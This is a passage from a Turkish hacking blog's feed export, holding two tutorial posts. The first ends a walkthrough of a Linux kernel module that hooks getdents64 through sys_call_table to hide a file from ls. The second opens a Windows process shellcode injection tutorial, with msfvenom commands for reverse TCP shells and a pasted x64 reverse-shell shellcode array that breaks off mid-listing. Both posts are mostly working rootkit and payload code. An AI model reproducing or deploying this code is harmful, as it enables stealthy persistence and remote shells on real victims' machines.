&lt;p&gt;Hooku basitce açıklayacak olursam. &lt;strong&gt;linux_dirent64&lt;/strong&gt; &lt;strong&gt;struct&lt;/strong&gt;‘u üzerinde bir döngü oluşturduk ve her bir dosya ismini aradık.&lt;/p&gt;

&lt;p&gt;Bizim belirttiğimiz gizlenilecek dosya ile aynı ismi taşıyorsa bunu &lt;strong&gt;ls&lt;/strong&gt; komutunda gösterme dedik.&lt;/p&gt;

&lt;h1 id=&quot;system-call-table&quot;&gt;System Call Table&lt;/h1&gt;
&lt;p&gt;Şimdi geldik değirmenin döndüğü yere.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;System Call Table&lt;/strong&gt; yani &lt;strong&gt;sys_call_table&lt;/strong&gt; kernelin içerdiği tüm sistem çağrılarını tutar. Aynı zamanda &lt;strong&gt;hafıza&lt;/strong&gt; yani &lt;strong&gt;memory&lt;/strong&gt; içerisinde nerede olduğunu bize gösterir.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;System Call Table&lt;/strong&gt;‘nin adresini linux içerisinde bulmamız gerek ki gerçek &lt;strong&gt;System Call&lt;/strong&gt; ile bizim yazdığımız sahte &lt;strong&gt;Hook&lt;/strong&gt; sistem çağrısını değiştirebilelim.&lt;/p&gt;

&lt;p&gt;Ve bu şekilde her &lt;strong&gt;ls&lt;/strong&gt; komutu çalıştığında gerçek &lt;strong&gt;getdents64&lt;/strong&gt; sistem çağrısı yerine bizim &lt;strong&gt;hook_getdents64&lt;/strong&gt; sistem çağrımız çalışıcak.&lt;/p&gt;

&lt;p&gt;Yazdığımız hook belirttiğimiz dosyayı gizlemeye yaradığından &lt;strong&gt;ls&lt;/strong&gt; komutu çalıştığında hiçbir şekilde görülemeyecek.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;sys_call_table&lt;/strong&gt;‘nin adresini bulmak için &lt;strong&gt;/boot&lt;/strong&gt; içerisinde bulunan &lt;strong&gt;System.map&lt;/strong&gt;‘e bakmamız gerekiyor :&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;deadbeef@pop-os:~$ sudo grep sys_call_table /boot/System.map-`uname -r`
ffffffff820001c0 R sys_call_table
ffffffff820015a0 R ia32_sys_call_table
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Ve bu şekilde &lt;strong&gt;sys_call_table&lt;/strong&gt;‘mizin adresini bulduk &lt;strong&gt;ffffffff820001c0&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Şimdide bu &lt;strong&gt;sys_call_table&lt;/strong&gt;‘ı yazılabilir yapmamız gerek ki asıl sistem çağrısı ile bizim sahte yani &lt;strong&gt;Hook&lt;/strong&gt; sistem çağrısını değiştirebilelim.&lt;/p&gt;

&lt;p&gt;Bunuda yapmak için vereceğimiz &lt;strong&gt;sys_call_table&lt;/strong&gt; adresinin &lt;strong&gt;table entry&lt;/strong&gt;‘sini &lt;strong&gt;manual&lt;/strong&gt; olarak writable yapmamız gerek.&lt;/p&gt;

&lt;p&gt;Bu stackoverflow sorusunun cevaplarında bunu yapmak için bir sürü teknik var bakmak isterseniz : &lt;a href=&quot;https://stackoverflow.com/questions/2103315/linux-kernel-system-call-hooking-example&quot;&gt;StackOverflow sys_call_table&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Bunuda &lt;strong&gt;lookup_address&lt;/strong&gt; fonksiyonu ile &lt;strong&gt;page table&lt;/strong&gt;‘nin adresini bulup sonrasında içerisinde &lt;strong&gt;sys_call_table&lt;/strong&gt;‘ye yazma yetkisi vermeliyiz :&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;int set_page_rw(unsigned long addr)
{
  unsigned int level;
  pte_t *pte = lookup_address(addr, &amp;amp;level);
  if (pte-&amp;gt;pte &amp;amp;~ _PAGE_RW) pte-&amp;gt;pte |= _PAGE_RW;
  return 0;
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Günün sonunda bu yazdığımız &lt;strong&gt;LKM&lt;/strong&gt;‘yi &lt;strong&gt;kernel&lt;/strong&gt;‘e yükleyeceğiz fakat sonrasında bunu sildiğimizde herşeyin tekrar aynı haline dönmesi olayıda var birde.&lt;/p&gt;

&lt;p&gt;Bunun içinde eğer &lt;strong&gt;sys_call_table&lt;/strong&gt;‘yi tekrardan &lt;strong&gt;Read-Only&lt;/strong&gt; yapmak istiyorsak yine aynı tekniği kullanabiliriz :&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;int set_page_ro(unsigned long addr)
{
  unsigned int level;
  pte_t *pte = lookup_address(addr, &amp;amp;level);
  pte-&amp;gt;pte = pte-&amp;gt;pte &amp;amp;~_PAGE_RW;
  return 0;
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Yetkilendirmeleri merak edenler varsa &lt;strong&gt;arch/x86/include/asm/pgtable_types.h&lt;/strong&gt; içerisinden küçük bir liste :&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#define _PAGE_BIT_PRESENT       0       /* is present */
#define _PAGE_BIT_RW            1       /* writeable */
#define _PAGE_BIT_USER          2       /* userspace addressable */
#define _PAGE_BIT_PWT           3       /* page write through */
#define _PAGE_BIT_PCD           4       /* page cache disabled */
#define _PAGE_BIT_ACCESSED      5       /* was accessed (raised by CPU) */
#define _PAGE_BIT_DIRTY         6       /* was written to (raised by CPU) */
#define _PAGE_BIT_PSE           7       /* 4 MB (or 2MB) page */
#define _PAGE_BIT_PAT           7       /* on 4KB pages */
#define _PAGE_BIT_GLOBAL        8       /* Global TLB entry PPro+ */
#define _PAGE_BIT_UNUSED1       9       /* available for programmer */
#define _PAGE_BIT_IOMAP         10      /* flag used to indicate IO mapping */
#define _PAGE_BIT_HIDDEN        11      /* hidden by kmemcheck */
#define _PAGE_BIT_PAT_LARGE     12      /* On 2MB or 1GB pages */
#define _PAGE_BIT_SPECIAL       _PAGE_BIT_UNUSED1
#define _PAGE_BIT_CPA_TEST      _PAGE_BIT_UNUSED1
#define _PAGE_BIT_SPLITTING     _PAGE_BIT_UNUSED1 /* only valid on a PSE pmd */
#define _PAGE_BIT_NX           63       /* No execute: only valid after cpuid check */
#define _PAGE_PRESENT   (_AT(pteval_t, 1) &amp;lt;&amp;lt; _PAGE_BIT_PRESENT)
#define _PAGE_RW        (_AT(pteval_t, 1) &amp;lt;&amp;lt; _PAGE_BIT_RW)
#define _PAGE_USER      (_AT(pteval_t, 1) &amp;lt;&amp;lt; _PAGE_BIT_USER)
#define _PAGE_PWT       (_AT(pteval_t, 1) &amp;lt;&amp;lt; _PAGE_BIT_PWT)
#define _PAGE_PCD       (_AT(pteval_t, 1) &amp;lt;&amp;lt; _PAGE_BIT_PCD)
#define _PAGE_ACCESSED  (_AT(pteval_t, 1) &amp;lt;&amp;lt; _PAGE_BIT_ACCESSED)
#define _PAGE_DIRTY     (_AT(pteval_t, 1) &amp;lt;&amp;lt; _PAGE_BIT_DIRTY)
#define _PAGE_PSE       (_AT(pteval_t, 1) &amp;lt;&amp;lt; _PAGE_BIT_PSE)
#define _PAGE_GLOBAL    (_AT(pteval_t, 1) &amp;lt;&amp;lt; _PAGE_BIT_GLOBAL)
#define _PAGE_UNUSED1   (_AT(pteval_t, 1) &amp;lt;&amp;lt; _PAGE_BIT_UNUSED1)
#define _PAGE_IOMAP     (_AT(pteval_t, 1) &amp;lt;&amp;lt; _PAGE_BIT_IOMAP)
#define _PAGE_PAT       (_AT(pteval_t, 1) &amp;lt;&amp;lt; _PAGE_BIT_PAT)
....
#define _PAGE_PAT_LARGE (_AT(pteval_t, 1) &amp;lt;&amp;lt; _PAGE_BIT_PAT_LARGE)
#define _PAGE_SPECIAL   (_AT(pteval_t, 1) &amp;lt;&amp;lt; _PAGE_BIT_SPECIAL)
#define _PAGE_CPA_TEST  (_AT(pteval_t, 1) &amp;lt;&amp;lt; _PAGE_BIT_CPA_TEST)
#define _PAGE_SPLITTING (_AT(pteval_t, 1) &amp;lt;&amp;lt; _PAGE_BIT_SPLITTING)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Modül yüklendiğinde yani &lt;strong&gt;insmod&lt;/strong&gt; çalıştığında :&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;static int __init getdents_hook_init(void)
{

  sys_call_table = (void*)0xffffffff820001c0;
  org_getdents64 = sys_call_table[__NR_getdents64];

  set_page_rw(sys_call_table);
  sys_call_table[__NR_getdents64] = hook_getdents64;
        return 0;
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;LKM&lt;/strong&gt;‘mizi oluşturup &lt;strong&gt;kernel&lt;/strong&gt;‘e dahil ettikten sonra çalışacak fonksiyon.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;ÖNEMLİ&lt;/strong&gt; : Buradaki &lt;strong&gt;sys_call_table = (void*)0xsizinsyscalltableadresiniz;&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Kısmını kendi &lt;strong&gt;sys_call_table&lt;/strong&gt; adresiniz ile değiştirmeniz gerekli.&lt;/p&gt;

&lt;p&gt;Nasıl bulacağınızı yukarıda anlatmıştım eğer blog içerisinde bulamadıysanız hemen &lt;strong&gt;CTRL + F&lt;/strong&gt; yapıp &lt;strong&gt;System.map&lt;/strong&gt; bunu arayın orada &lt;strong&gt;sys_call_table&lt;/strong&gt; adresinin nasıl bulunacağını anlattım.&lt;/p&gt;

&lt;p&gt;Şimdi geldik eğer bunu silmek istersek kısmına :&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;static void __exit getdents_hook_exit(void)
{
  sys_call_table[__NR_getdents64] = org_getdents64;
  set_page_ro(sys_call_table);
        return 0;
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Eğer oluşturduğumuz &lt;strong&gt;LKM&lt;/strong&gt;‘yi silersek oluşturduğumuz sahte &lt;strong&gt;Hook&lt;/strong&gt; fonksiyonunu &lt;strong&gt;sys_call_table&lt;/strong&gt;‘den çıkartıp herşeyi tekrar eski haline çevirmesini söylüyoruz programımıza aynı zamanda &lt;strong&gt;table entry&lt;/strong&gt;‘ide tekrardan &lt;strong&gt;Read-Only&lt;/strong&gt; yapıyoruz.&lt;/p&gt;

&lt;p&gt;Şimdi tüm bu yazdığımız kodları tek bir bütün haline almaya geldi sıra hepsini pastebine yüklüyorum. İçerisinden değiştirmeniz gereken tek kısım &lt;strong&gt;sys_call_table&lt;/strong&gt; adresi.&lt;/p&gt;

&lt;p&gt;Kod : &lt;a href=&quot;https://pastebin.com/a4MF1J7T&quot;&gt;System Call Hooking Code&lt;/a&gt;&lt;/p&gt;

&lt;h1 id=&quot;make&quot;&gt;Make&lt;/h1&gt;
&lt;p&gt;Şimdi sıra geldi bu kodu derlemeye.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Makefile&lt;/strong&gt; isminde bir dosya oluşturun ve yukarıda yazdığımız kodu nasıl kaydettiyseniz burada bulunan &lt;strong&gt;syscallhook.o&lt;/strong&gt; ismini onunla değiştiriniz.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;obj-m += syscallhook.o

all:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;make&lt;/strong&gt; komutunu çalıştırıp derledikten sonra çıktımız :&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@heyhey:~/hey# make
make -C /lib/modules/4.4.0-78-generic/build M=/root/hey modules
make[1]: Entering directory `/usr/src/linux-headers-4.4.0-78-generic'
  CC [M]  /root/hey/syscallhook.o
/root/hey/syscallhook.c: In function ‘hook_getdents64’:
/root/hey/syscallhook.c:36:21: warning: assignment from incompatible pointer type [enabled by default]
                 cur = (struct linux_dirent*) ((char*)dirp + i);
                     ^
/root/hey/syscallhook.c: In function ‘getdents_hook_init’:
/root/hey/syscallhook.c:63:3: warning: passing argument 1 of ‘set_page_rw’ makes integer from pointer without a cast [enabled by default]
   set_page_rw(sys_call_table);
   ^
/root/hey/syscallhook.c:41:5: note: expected ‘long unsigned int’ but argument is of type ‘void **’
 int set_page_rw(unsigned long addr)
     ^
/root/hey/syscallhook.c: In function ‘getdents_hook_exit’:
/root/hey/syscallhook.c:71:3: warning: passing argument 1 of ‘set_page_ro’ makes integer from pointer without a cast [enabled by default]
   set_page_ro(sys_call_table);
   ^
/root/hey/syscallhook.c:49:5: note: expected ‘long unsigned int’ but argument is of type ‘void **’
 int set_page_ro(unsigned long addr)
     ^
/root/hey/syscallhook.c:72:9: warning: ‘return’ with a value, in function returning void [enabled by default]
         return 0;
         ^
  Building modules, stage 2.
  MODPOST 1 modules
  CC      /root/hey/syscallhook.mod.o
  LD [M]  /root/hey/syscallhook.ko
make[1]: Leaving directory `/usr/src/linux-headers-4.4.0-78-generic'
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;LKM&lt;/strong&gt;‘mizi derledikten sonra şimdi sıra geldi &lt;strong&gt;ls&lt;/strong&gt; komutundan kaçıracağımız baştada belirttiğimiz dosya ismini oluşturmaya :&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@heyhey:~/hey# touch cokgizlidosya.txt
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Bundan sonrası ziyafet. Şimdi oluşturduğumuz modülü kernel içerisine &lt;strong&gt;insmod&lt;/strong&gt; komutu ile aktaralım :&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@heyhey:~/hey# insmod ./syscallhook.ko
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Modülü yüklemeden önce &lt;strong&gt;ls&lt;/strong&gt; komutunun bulduğu dosyalar :&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; root@heyhey:~/hey# ls
cokgizlidosya.txt  Module.symvers  syscallhook.mod.c
Makefile           syscallhook.c   syscallhook.mod.o
modules.order      syscallhook.ko  syscallhook.o
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Modülü yükledikten sonra &lt;strong&gt;ls&lt;/strong&gt; komutunun bulduğu dosyalar :&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; root@heyhey:~/hey# ls
Makefile       Module.symvers  syscallhook.ko     syscallhook.mod.o
modules.order  syscallhook.c   syscallhook.mod.c  syscallhook.o
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Gördüğünüz gibi &lt;strong&gt;ls&lt;/strong&gt; komutundan &lt;strong&gt;cokgizlidosya.txt&lt;/strong&gt; dosyamızı gizlemeyi &lt;strong&gt;System Call Table&lt;/strong&gt; içerisindeki &lt;strong&gt;ls&lt;/strong&gt; komutunun kullandığı sistem çağrılarını hook ederek başardık.&lt;/p&gt;

&lt;p&gt;Bu modülü silip herşeyi eski haline çevirmek için :&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; root@heyhey:~/hey# rmmod syscallhook
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Ve bu yazının da sonunda geldik. Umarım açıklayıcı anlatabilmişimdir.&lt;/p&gt;

&lt;p&gt;Sorular için twitter hesabım : &lt;a href=&quot;https://twitter.com/0DAYanc&quot;&gt;@0DAYanc&lt;/a&gt;&lt;/p&gt;</content><author><name></name></author><summary type="html">Linux System Call Hooking</summary></entry><entry><title type="html">Process Shellcode Injection</title><link href="http://localhost:4000/2019/04/28/Process-Shellcode-Injection.html" rel="alternate" type="text/html" title="Process Shellcode Injection" /><published>2019-04-28T00:00:00+03:00</published><updated>2019-04-28T00:00:00+03:00</updated><id>http://localhost:4000/2019/04/28/Process-Shellcode-Injection</id><content type="html" xml:base="http://localhost:4000/2019/04/28/Process-Shellcode-Injection.html">&lt;h3 id=&quot;process-shellcode-injection&quot;&gt;Process Shellcode Injection&lt;/h3&gt;

&lt;p&gt;Merhaba arkadaşlar yeni yazıma hoşgeldiniz.&lt;/p&gt;

&lt;p&gt;Çinliler ile olan birkaç serüvenim yüzünden bu yazıyı biraz geç yazmak zorunda kaldım.&lt;/p&gt;

&lt;p&gt;Serüvenlerden &lt;a href=&quot;https://twitter.com/0DAYanc/status/1121174960209301504&quot;&gt;bir tanesini twitterde&lt;/a&gt; paylaştım bakmak isterseniz.&lt;/p&gt;

&lt;p&gt;Hiç uzatmadan yazımıza geçelim. Bu yazımızda &lt;strong&gt;windows&lt;/strong&gt; içerisinde bulunan &lt;strong&gt;process&lt;/strong&gt;‘ler içerisine nasıl &lt;strong&gt;shellcode&lt;/strong&gt; &lt;strong&gt;inject&lt;/strong&gt; edebileceğimizi göreceğiz.&lt;/p&gt;

&lt;p&gt;Öncelikle yazımıza geçmeden önce &lt;strong&gt;C&lt;/strong&gt;, &lt;strong&gt;Windows Memory Management&lt;/strong&gt;, &lt;strong&gt;Heap - Stack&lt;/strong&gt; gibi kavramlara alışık olduğunuzu varsayıp bu yazıyı devam ettiriyorum.&lt;/p&gt;

&lt;h2 id=&quot;bilmemiz-gereken-kavramlar&quot;&gt;Bilmemiz gereken kavramlar&lt;/h2&gt;

&lt;h1 id=&quot;shellcode-nedir-&quot;&gt;Shellcode Nedir ?&lt;/h1&gt;

&lt;p&gt;&lt;em&gt;Shellcode kabuk kod demektir. Bunlara kısaca &lt;strong&gt;Hexcode&lt;/strong&gt; veya &lt;strong&gt;Hex&lt;/strong&gt; de diyebiliriz.&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;&lt;em&gt;Örneğin büyük &lt;strong&gt;A&lt;/strong&gt; harfinin &lt;strong&gt;shellcode&lt;/strong&gt; yani &lt;strong&gt;hexcode&lt;/strong&gt; yani &lt;strong&gt;hex&lt;/strong&gt; karşılığı &lt;strong&gt;0x41&lt;/strong&gt;‘dir.&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;Basit bir şekilde &lt;strong&gt;makine kodu&lt;/strong&gt; dur.&lt;/p&gt;

&lt;p&gt;&lt;em&gt;&lt;strong&gt;İşletim sistemi&lt;/strong&gt; ve &lt;strong&gt;User-mode application&lt;/strong&gt;‘ların birbirleri ile anlaştığı dil de diyebiliriz.&lt;/em&gt;&lt;/p&gt;

&lt;h1 id=&quot;process-nedir-&quot;&gt;Process Nedir ?&lt;/h1&gt;

&lt;p&gt;&lt;em&gt;&lt;strong&gt;İşletim sistemi&lt;/strong&gt;‘nin arka planında çalışan &lt;strong&gt;Uygulamalar&lt;/strong&gt; yani &lt;strong&gt;User-mode applications&lt;/strong&gt; diyebiliriz.&lt;/em&gt;&lt;/p&gt;

&lt;h1 id=&quot;process-shellcode-injection-nedir-&quot;&gt;Process Shellcode Injection Nedir ?&lt;/h1&gt;

&lt;p&gt;&lt;em&gt;Yukarıda ki iki terimi birleştirip yanına &lt;strong&gt;Injection&lt;/strong&gt; eklediğimizde oluşan kavram.&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;&lt;em&gt;Ya da daha kompleks şekilde mevcut bir &lt;strong&gt;process&lt;/strong&gt; içerisinde çalışan &lt;strong&gt;hexcode&lt;/strong&gt;‘ların önüne eklediğimiz yeni &lt;strong&gt;hexcode&lt;/strong&gt;‘lar da &lt;strong&gt;Process Shellcode Injection&lt;/strong&gt; kavramına uygundur.&lt;/em&gt;&lt;/p&gt;

&lt;h2 id=&quot;herşeyden-önce&quot;&gt;Herşeyden önce&lt;/h2&gt;
&lt;p&gt;Birazdan yazmaya ve anlatmaya başlayacağımız &lt;strong&gt;Process Shellcode Injection&lt;/strong&gt;‘u gerçekleştirmek için gerekli olan kaynak kodu &lt;strong&gt;derleme&lt;/strong&gt; sıkıntısı yaşayanlar olursa &lt;strong&gt;Visual Studio 2019 Community&lt;/strong&gt; IDE’sini indirip içerisinde derleyebilir.&lt;/p&gt;

&lt;h2 id=&quot;kaynak-kodumuza-geçelim&quot;&gt;Kaynak kodumuza geçelim&lt;/h2&gt;

&lt;p&gt;Kütüphanelerimizi dahil edelim :&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#include &amp;lt;windows.h&amp;gt;
#include &amp;lt;psapi.h&amp;gt;
#include &amp;lt;stdio.h&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Main fonksiyonumuzu oluşturalım :&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;int main(int argc, char** argv) {

}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Şimdi geldik biraz zahmetli kısıma :&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;unsigned char shellcode[] = &quot;shellcodeburaya&quot;;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Bu kısım bizim &lt;strong&gt;process&lt;/strong&gt; içerisinde çalıştıracağımız &lt;strong&gt;hexcode&lt;/strong&gt; yani &lt;strong&gt;shellcode&lt;/strong&gt;‘umuzu içeriyor.&lt;/p&gt;

&lt;p&gt;Bunu oluşturmak için uğraşmadan &lt;strong&gt;metasploit&lt;/strong&gt; içerisinde bulunan &lt;strong&gt;msfvenom&lt;/strong&gt; toolundan yararlanabiliriz.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;x64&lt;/strong&gt; için :&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.0.104 LPORT=4444 -f c -b \x00\x0a\x0d
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;x32&lt;/strong&gt; için:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msfvenom -p windows/shell/reverse_tcp LHOST=192.168.0.104 LPORT=4444 -f c -b \x00\x0a\x0d
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Burada bulunan &lt;strong&gt;LHOST&lt;/strong&gt; ve&lt;strong&gt;LPORT&lt;/strong&gt; kısmını kendinize göre düzenlediğinizi varsayıyorum&lt;/p&gt;

&lt;p&gt;Komutu çalıştırdıktan sonra bize &lt;strong&gt;C&lt;/strong&gt; ile uyumlu bir &lt;strong&gt;shellcode&lt;/strong&gt; gelecek aşşağıda yüklediğim fotoraftaki gibi :&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://i.hizliresim.com/16QMMA.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Bu gelen &lt;strong&gt;shellcode&lt;/strong&gt;‘u yukarıdaki &lt;strong&gt;buffer&lt;/strong&gt;‘imize ekleyelim :&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;unsigned char shellcode[] = 
		 &quot;\x48\x31\xc9\x48\x81\xe9\xc6\xff\xff\xff\x48\x8d\x05\xef\xff&quot;
		 &quot;\xff\xff\x48\xbb\x9e\xfc\xbf\xb8\x05\xa1\x62\x7f\x48\x31\x58&quot;
		 &quot;\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4\x62\xb4\x3c\x5c\xf5\x49&quot;
		 &quot;\xa2\x7f\x9e\xfc\xfe\xe9\x44\xf1\x30\x2e\xc8\xb4\x8e\x6a\x60&quot;
		 &quot;\xe9\xe9\x2d\xfe\xb4\x34\xea\x1d\xe9\xe9\x2d\xbe\xb4\x34\xca&quot;
		 &quot;\x55\xe9\x6d\xc8\xd4\xb6\xf2\x89\xcc\xe9\x53\xbf\x32\xc0\xde&quot;
		 &quot;\xc4\x07\x8d\x42\x3e\x5f\x35\xb2\xf9\x04\x60\x80\x92\xcc\xbd&quot;
		 &quot;\xee\xf0\x8e\xf3\x42\xf4\xdc\xc0\xf7\xb9\xd5\x2a\xe2\xf7\x9e&quot;
		 &quot;\xfc\xbf\xf0\x80\x61\x16\x18\xd6\xfd\x6f\xe8\x8e\xe9\x7a\x3b&quot;
		 &quot;\x15\xbc\x9f\xf1\x04\x71\x81\x29\xd6\x03\x76\xf9\x8e\x95\xea&quot;
		 &quot;\x37\x9f\x2a\xf2\x89\xcc\xe9\x53\xbf\x32\xbd\x7e\x71\x08\xe0&quot;
		 &quot;\x63\xbe\xa6\x1c\xca\x49\x49\xa2\x2e\x5b\x96\xb9\x86\x69\x70&quot;
		 &quot;\x79\x3a\x3b\x15\xbc\x9b\xf1\x04\x71\x04\x3e\x15\xf0\xf7\xfc&quot;
		 &quot;\x8e\xe1\x7e\x36\x9f\x2c\xfe\x33\x01\x29\x2a\x7e\x4e\xbd\xe7&quot;
		 &quot;\xf9\x5d\xff\x3b\x25\xdf\xa4\xfe\xe1\x44\xfb\x2a\xfc\x72\xdc&quot;
		 &quot;\xfe\xea\xfa\x41\x3a\x3e\xc7\xa6\xf7\x33\x17\x48\x35\x80\x61&quot;
		 &quot;\x03\xe2\xf1\xbb\xd6\x11\x4d\xc1\xcf\x8d\xb8\x05\xe0\x34\x36&quot;
		 &quot;\x17\x1a\xf7\x39\xe9\x01\x63\x7f\x9e\xb5\x36\x5d\x4c\x1d\x60&quot;
		 &quot;\x7f\x8f\xa0\x7f\x10\x05\xc9\x23\x2b\xd7\x75\x5b\xf4\x8c\x50&quot;
		 &quot;\x23\xc5\xd2\x8b\x99\xbf\xfa\x74\x2e\xf6\x74\x94\xbe\xb9\x05&quot;
		 &quot;\xa1\x3b\x3e\x24\xd5\x3f\xd3\x05\x5e\xb7\x2f\xce\xb1\x8e\x71&quot;
		 &quot;\x48\x90\xa2\x37\x61\x3c\xf7\x31\xc7\xe9\x9d\xbf\xd6\x75\x7e&quot;
		 &quot;\xf9\xbf\x4b\x6d\xa0\x7e\x03\x6a\xf0\x8c\x66\x08\x6f\xdf\xa4&quot;
		 &quot;\xf3\x31\xe7\xe9\xeb\x86\xdf\x46\x26\x1d\x71\xc0\x9d\xaa\xd6&quot;
		 &quot;\x7d\x7b\xf8\x07\xa1\x62\x36\x26\x9f\xd2\xdc\x05\xa1\x62\x7f&quot;
		 &quot;\x9e\xbd\xef\xf9\x55\xe9\xeb\x9d\xc9\xab\xe8\xf5\x34\x61\x08&quot;
		 &quot;\x72\xc7\xbd\xef\x5a\xf9\xc7\xa5\x3b\xba\xa8\xbe\xb9\x4d\x2c&quot;
		 &quot;\x26\x5b\x86\x3a\xbf\xd0\x4d\x28\x84\x29\xce\xbd\xef\xf9\x55&quot;
		 &quot;\xe0\x32\x36\x61\x3c\xfe\xe8\x4c\x5e\xaa\x32\x17\x3d\xf3\x31&quot;
		 &quot;\xc4\xe0\xd8\x06\x52\xc3\x39\x47\xd0\xe9\x53\xad\xd6\x03\x75&quot;
		 &quot;\x33\x0b\xe0\xd8\x77\x19\xe1\xdf\x47\xd0\x1a\x92\xca\x3c\xaa&quot;
		 &quot;\xfe\x02\xa3\x34\xdf\xe2\x61\x29\xf7\x3b\xc1\x89\x5e\x79\xe2&quot;
		 &quot;\xf6\x3f\x43\xe5\xd4\x67\xc4\xd9\xef\xcd\xd7\x6f\xa1\x3b\x3e&quot;
